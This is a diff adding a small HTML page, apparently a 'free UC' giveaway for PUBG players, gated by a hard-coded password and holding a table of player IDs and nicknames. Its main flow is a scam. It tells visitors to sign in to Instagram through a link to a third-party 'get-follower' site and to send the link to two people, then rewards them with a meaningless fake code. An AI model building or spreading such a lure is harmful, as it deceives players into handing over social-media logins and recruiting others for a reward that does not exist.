@@ -1,0 +1,184 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>light speed</title>
+    <style>
+    body{
+       color:white;
+       background-color: black;
+       background-image: url(pubg.jpg);
+       background-position: center;
+       background-repeat: no-repeat;
+       background-size: 
+    }
+    .h{
+        text-align: center;
+        font-family: Times New Roman;
+        font-size: 80px;
+        margin-top: 90px;
+        background-color: #00BEFF;
+        border-radius:50px 20px 50px 20px;
+        
+        
+    }
+    input{
+        text-align: center;
+        display: block;
+        margin: auto;
+        width:80%;
+        height:50px;
+        font-size: 40px;
+        border-radius:10px;
+    }
+    button{
+        width: 40%;
+        background-color: green;
+        border-radius:10px;
+        height: 50px;
+        margin-top: 20px;
+        margin-left:90px ;
+        font-size: 30px;
+        
+    }
+    .send{
+        margin-left:480px ;
+        margin-top:-50px;
+        width:40%;
+        display: none;
+    }
+    label{
+        font-size: 30px;
+    }
+    h4{
+        font-family: Times New Roman;
+        font-size: 15px;
+        color:#00F0FF;
+    }
+    span{
+        padding:30px;
+        color: red;
+    }
+    a{
+        text-align: center;
+        display: block;
+        text-decoration: none;
+        color:white;
+        margin-top: 20px;
+    }
+    p{
+        font-family: Times New Roman;
+        font-size: 20px;
+    }
+    .main{
+        display: none;
+    }
+    .login{
+        height:300px;
+        width: 450px;
+        background-color: gray;
+        border-radius:20px;
+        margin: 450px auto;
+        text-align: center;
+        padding:20px;
+    }
+    h2{
+        font-size: 30px;
+        color: green;
+        
+    }
+    .in{
+        margin-right: 80px;
+    }
+    .pass{
+        width: 90%;
+        font-size: 20px;
+        background-color: white;
+        
+    }
+    
+    </style>
+</head>
+<body>
+    <div class="login" id="login">
+       <audio controls autoplay>
+           <source src="king.mp3" type="audio/mpeg"/>
+       </audio> 
+        <h2>PASSWORD</h2>
+        <input  class="pass"type="password" name="password" id="password" value="" placeholder="enter password"/>
+        <button class="in"onclick="signin()">sign in</button>
+        
+    </div>
+    
+    <div class="main" id="main">
+    <p class="h">UC</p>
+    <h4>Hello, user!
+
+If you want to get free UC with the approval of LightSpeed, please follow these steps:<br><br>
+
+<span>1. First, register on Instagram.</span><br><br>
+
+
+<span>2. Send the Instagram link to two people.</span>
+
+<a   id ="link"onclick="old()"href="https://toolsxsocial.in/get-follower/76Z76hbh3d">sign in the instagram</a>
+
+</h4>
+    <label>Your ID:</label>
+    <input type="text" id="number" placeholder="your ID"/><br>
+   
+  <br>
+    <label for="">UC:</label>
+    <input id ="king"type="number"placeholder="UC"/>
+     <button onclick="searchUser()">Search</button>
+     <button  id ="send"class="send" onclick="king()" >send</button>
+      <p id="resulte"></p>
+    </div>
+    
+    <script>
+    function signin(){
+        let password = document.getElementById('password').value;
+        if(password === "kingmustafa12"){
+            document.getElementById('login').style.display ="none";
+            document.getElementById('main').style.display = "block";
+        }
+        else{
+            alert('flase password')
+        }
+    }
+        const mustafa = {
+            "51379112033": "KF ZORO",
+            "52108068208": "جگر خون",
+            "51542862324": "KF丨ＬＵＦＦＹ",
+            "51577946156": "60fps十AFG",
+            "5713747853": "60fps十NoRî",
+            "51991423824": "60fps十ÀKÁ",
+            "51858797162":"kf?hadi",
+            "51799551230":"ＫＦ丨ZERO",
+            "5791800371":"Ｓｈａ¥ｎｋｓ",
+        };
+
+        function searchUser(){
+            let inputNumber = document.getElementById('number').value.trim();
+            let resulteElement = document.getElementById('resulte');
+            
+            if(mustafa[inputNumber]){
+                resulteElement.innerHTML = "Your name is: " + mustafa[inputNumber];
+                resulteElement.style.color = "green";
+            } else {
+                resulteElement.innerHTML = "You do not have an account";
+                resulteElement.style.color = "red";
+            }
+        }
+        function old(){
+            document.getElementById('link').style.display="none";
+            document.getElementById('send').style.display ="block";
+        }
+        function king(){
+          
+            alert('complete(: this is your code (mmog9t6gvjfe676ghu6468yfhjr45)')
+j
+        }
+    </script>
+</body>
+</html>
